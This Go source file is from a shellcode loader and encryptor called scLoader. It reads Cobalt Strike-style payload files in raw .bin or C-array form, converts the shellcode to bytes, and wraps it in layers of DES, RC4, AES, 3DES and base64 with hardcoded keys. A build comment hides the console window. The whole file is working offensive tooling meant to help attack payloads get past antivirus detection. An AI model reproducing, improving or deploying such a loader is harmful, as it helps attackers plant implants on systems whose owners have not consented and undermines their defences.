package core

import (
	"bufio"
	"crypto/rc4"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path"
	"regexp"
	"strings"
)

var (
	// 定义命令行解析参数
	h bool
	v bool
	e string
	//c string
	f string
)

func init() {
	flag.BoolVar(&h, "h", false, "this help `message`")
	flag.BoolVar(&v, "v", false, "show `version` and exit")

	// 注意 `shellcode`。默认是 -s string，有了 `shellcode` 之后，变为 -s shellcode
	flag.StringVar(&e, "e", "des,rc4,aes,3des,base64", "specify `encryption` mode;You can specify more than one at a time, separated by commas, and the last one must use base64 encoding")
	//flag.StringVar(&c, "c", "", "`shellcode`")
	flag.StringVar(&f, "f", "", "shellcode file,ex:`payload.bin`")

	// 改变默认的 Usage
	flag.Usage = usage

}

func usage() {
	fmt.Fprintf(os.Stderr, `scLoader version: 1.10.0
Usage: scLoader [-e AES,Base64] [-v] [-h] [-f shellcode filename]

Options:
`)
	flag.PrintDefaults()
}

func CmdStart() {
	//go build -trimpath -ldflags="-w -s -H=windowsgui"
	flag.Parse()
	//定义byte[]类型的shellcode,初始化的数据随便写的
	shellcode := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52}
	//如果存在未解析的参数， 退出程序
	if len(flag.Args()) != 0 {
		os.Exit(3)
	}
	if h {
		flag.Usage()
	} else if v {
		fmt.Println("SCLoader version: 1.10.0")
	} else {
		var shell string
		if len(f) == 0 {
			os.Exit(3)
		}
		if strings.EqualFold(path.Ext(path.Base(f)), ".bin") {
			//CS通过Raw生成的payload.bin中的shellcode可以通过该方式直接读取
			shellcodeFileData, err := ioutil.ReadFile(f)
			checkError(err)
			shellcode = shellcodeFileData
		} else if strings.EqualFold(path.Ext(path.Base(f)), ".c") {
			//CS生成C语言的payload.c中的shellcode可以通过该方式读取
			file, err := os.OpenFile(f, os.O_RDWR, 0666)
			if err != nil {
				fmt.Println("Open file error!", err)
				return
			}
			defer file.Close()

			stat, err := file.Stat()
			if err != nil {
				panic(err)
			}
			var size = stat.Size()
			fmt.Println("file size=", size)
			filestr := ""
			buf := bufio.NewReader(file)
			for {
				line, err := buf.ReadString('\n')
				line = strings.TrimSpace(line)
				//fmt.Println(line)
				filestr += line
				if err != nil {
					if err == io.EOF {
						r, _ := regexp.Compile("\"(.*)\"")
						//fmt.Println(r.FindString(filestr))
						strReplaceAll := strings.ReplaceAll(r.FindString(filestr), "\\x", "")
						strReplaceAll = strings.ReplaceAll(strReplaceAll, "\"", "")
						//fmt.Println(strReplaceAll)
						shellcode, err = hex.DecodeString(strReplaceAll)
						if err != nil {
							fmt.Println(err)
						}
						fmt.Println("File read ok!")
						break
					} else {
						fmt.Println("Read file error!", err)
						return
					}
				}
			}
		}
		slice := strings.Split(e, ",")
		for i := 0; i < len(slice); i++ {
			if strings.EqualFold(slice[i], "Base64") {
				shell = base64.StdEncoding.EncodeToString(shellcode)
				shellcode = []byte(shell)
			} else if strings.EqualFold(slice[i], "rc4") {
				//加密操作,直接覆盖源数据
				cipherde, _ := rc4.NewCipher([]byte("momohk"))
				cipherde.XORKeyStream(shellcode, shellcode)
			} else if strings.EqualFold(slice[i], "des") {
				shellcode, _ = DesEncrypt(shellcode, []byte("vikeryoo"))
			} else if strings.EqualFold(slice[i], "3des") {
				shellcode, _ = TripleDesEncrypt(shellcode, []byte("123456789012345678901234"), []byte("yoooyooq"))
			} else if strings.EqualFold(slice[i], "aes") {
				shellcode = AesEncryptCBC(shellcode, []byte("yoolaescbcuuyool"))
			} else {
				os.Exit(3)
			}
			fmt.Println(slice[i])
		}
		fmt.Println(shell)
	}
}
